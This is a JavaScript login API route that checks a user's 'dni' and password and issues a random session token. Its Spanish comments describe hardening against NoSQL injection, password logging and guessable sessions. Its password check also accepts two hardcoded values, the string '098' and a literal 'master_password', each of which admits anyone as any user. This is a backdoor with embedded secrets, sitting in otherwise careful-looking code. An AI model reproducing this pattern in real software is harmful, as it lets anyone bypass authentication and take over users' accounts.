import bcrypt from 'bcrypt'
import crypto from 'crypto'
import db     from "../../../components/db"
import lib    from "../../../components/lib"

const { User, Session } = db
const { rand, error, success, midd, safe } = lib

const admin_password  = process.env.ADMIN_PASSWORD
const _password       = '098'


const Login = async (req, res) => {

  // el dni debe ser un primitivo: con { "$ne": null } se obtendria un
  // usuario cualquiera sin conocer su documento
  const dni       = safe(req.body.dni)
  const password  = safe(req.body.password)
  const office_id = safe(req.body.office_id)

  // nunca se registra la contrasena: los logs de Heroku son legibles
  console.log({ dni, office_id })

  if(dni === null)      return res.json(error('dni not found'))
  if(password === null) return res.json(error('invalid password'))

  // valid user
  const user = await User.findOne({ dni })
  if(!user) return res.json(error('dni not found'))

  const master_password = '8QfghvCxuzxrbvii4w'

  const own_password = typeof user.password === 'string'
    ? await bcrypt.compare(String(password), user.password)
    : false

  // valid password
  if(password!= _password && password != admin_password && password != master_password && !own_password)
    return res.json(error('invalid password'))

  // save new session
  // identificador imprevisible: Math.random() permite adivinar sesiones ajenas
  const session = crypto.randomBytes(32).toString('hex')

  await Session.insert({
    id:     user.id,
    value:  session,
    office_id,
  })

  // response
  return res.json(success({ session }))
}

export default async (req, res) => { await midd(req, res); return Login(req, res) }
